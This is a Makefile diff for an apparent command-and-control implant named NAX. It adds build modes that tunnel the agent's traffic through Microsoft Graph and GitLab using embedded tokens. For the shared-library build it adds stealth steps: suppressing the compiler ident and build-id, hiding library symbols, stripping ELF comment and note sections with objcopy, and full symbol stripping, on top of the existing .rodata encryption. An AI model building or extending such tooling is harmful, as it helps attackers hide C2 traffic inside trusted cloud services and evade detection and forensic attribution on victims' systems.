@@ -115,6 +115,40 @@ else ifeq ($(NAX_TCP_MODE),https)
   LDFLAGS  = -pie -Wl,-Bstatic -lpthread -lz -Wl,-Bdynamic \
              $(CURL_LIBS) -lssl -lcrypto -Wl,-z,relro,-z,now -Wl,-z,noexecstack
   LDFLAGS_EXTRA :=
+else ifeq ($(NAX_TCP_MODE),graph)
+  # Graph params come from nax_config.h (SAS token has chars unsafe for -D)
+  CFLAGS  += -DNAX_GRAPH_MODE
+  SUFFIX  := _graph
+  SRCS    := src/agent.c src/Core/crypto.c src/Core/packer.c \
+             src/Core/sysinfo.c src/Commands/commands.c \
+             src/Commands/tunnel.c \
+             src/Commands/zip.c \
+             src/Transport/graph.c
+  ifeq ($(CURL_LIBS),)
+    CURL_LIBS  := $(shell pkg-config --libs   libcurl 2>/dev/null || echo -lcurl)
+  endif
+  ifeq ($(CURL_CFLAGS),)
+    CURL_CFLAGS := $(shell pkg-config --cflags libcurl 2>/dev/null)
+  endif
+  CFLAGS        += $(CURL_CFLAGS)
+  LDFLAGS_EXTRA := $(CURL_LIBS) -lssl -lcrypto
+else ifeq ($(NAX_TCP_MODE),gitlab)
+  # GitLab params come from nax_config.h (token has chars unsafe for -D)
+  CFLAGS  += -DNAX_GITLAB_MODE
+  SUFFIX  := _gitlab
+  SRCS    := src/agent.c src/Core/crypto.c src/Core/packer.c \
+             src/Core/sysinfo.c src/Commands/commands.c \
+             src/Commands/tunnel.c \
+             src/Commands/zip.c \
+             src/Transport/gitlab.c
+  ifeq ($(CURL_LIBS),)
+    CURL_LIBS  := $(shell pkg-config --libs   libcurl 2>/dev/null || echo -lcurl)
+  endif
+  ifeq ($(CURL_CFLAGS),)
+    CURL_CFLAGS := $(shell pkg-config --cflags libcurl 2>/dev/null)
+  endif
+  CFLAGS        += $(CURL_CFLAGS)
+  LDFLAGS_EXTRA := $(CURL_LIBS) -lssl -lcrypto
 else
   CFLAGS  += -DNAX_C2_HOST=\"$(NAX_C2_HOST)\" \
              -DNAX_C2_PORT=$(NAX_C2_PORT)
@@ -159,8 +193,12 @@ endif
 ifeq ($(NAX_FORMAT),so)
   SRCS   += src/shared.c
   CFLAGS := $(subst -fPIE,-fPIC,$(CFLAGS))
+  CFLAGS += -fno-ident
   LDFLAGS := $(subst -pie,-shared,$(LDFLAGS))
   LDFLAGS := $(subst -Wl$(comma)-Bstatic -lpthread -lz -Wl$(comma)-Bdynamic,-lpthread -lz,$(LDFLAGS))
+  LDFLAGS += -Wl,--version-script=src/stub/export.map
+  LDFLAGS += -Wl,--exclude-libs,ALL
+  LDFLAGS += -Wl,--build-id=none
   SUFFIX := $(SUFFIX).so
   RODATA_ENCRYPT := 1
 else
@@ -189,8 +227,15 @@ ifeq ($(RODATA_ENCRYPT),1)
 	@echo "[+] Encrypting .rodata in $(TARGET)"
 	python3 $(RODATA_CRYPT) $(TARGET)
 endif
+ifeq ($(NAX_FORMAT),so)
+	@objcopy --remove-section=.comment \
+	         --remove-section=.note.GNU-stack \
+	         --remove-section=.note.gnu.build-id \
+	         --remove-section=.note.ABI-tag \
+	         $(TARGET) 2>/dev/null || true
+endif
 ifeq ($(NAX_DEBUG),0)
-	$(STRIP) $(TARGET)
+	$(STRIP) --strip-all $(TARGET)
 endif
 
 $(OUTDIR):
